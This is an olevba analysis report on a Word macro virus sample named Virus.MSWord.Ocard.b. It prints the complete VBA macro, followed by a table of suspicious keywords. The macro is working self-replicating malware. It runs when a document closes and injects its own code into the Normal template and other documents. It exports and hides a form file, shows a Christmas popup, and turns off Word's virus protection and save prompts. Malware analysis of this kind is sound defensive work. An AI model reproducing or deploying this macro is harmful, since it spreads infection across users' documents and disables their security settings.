olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ocard.b-22d7873e157317d2bb12486f5bf43ddd916099ab
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ocard.b-22d7873e157317d2bb12486f5bf43ddd916099ab - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
'Draco Malfoy in Norway @ -40
Dim Basilisk As String
Dim Harry As Integer
On Error GoTo Hell
Basilisk = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 33)
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1), 6) <> "'Draco" Then
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString Basilisk
For Harry = 2 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents.Item(Harry).Name = "Norway" Then
    ActiveDocument.VBProject.VBComponents.Item(Harry).Export "c:\Tribe"
    SetAttr "c:\Tribe", vbHidden
    SetAttr "c:\tribe.frx", vbHidden
    End If
Next Harry
End If
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1), 6) <> "'Draco" Then
    ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromString Basilisk
    ActiveDocument.VBProject.VBComponents.Import "c:\Tribe"
End If
If Month(Now) = 12 And Day(Now) >= 24 Then
Load Norway
Norway.CommandButton1.Caption = "Merry Christmas " & Application.UserName
Norway.Show
Unload Norway
End If
With Options
    .VirusProtection = False
    .SaveNormalPrompt = False
    .ConfirmConversions = False
End With
Hell:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

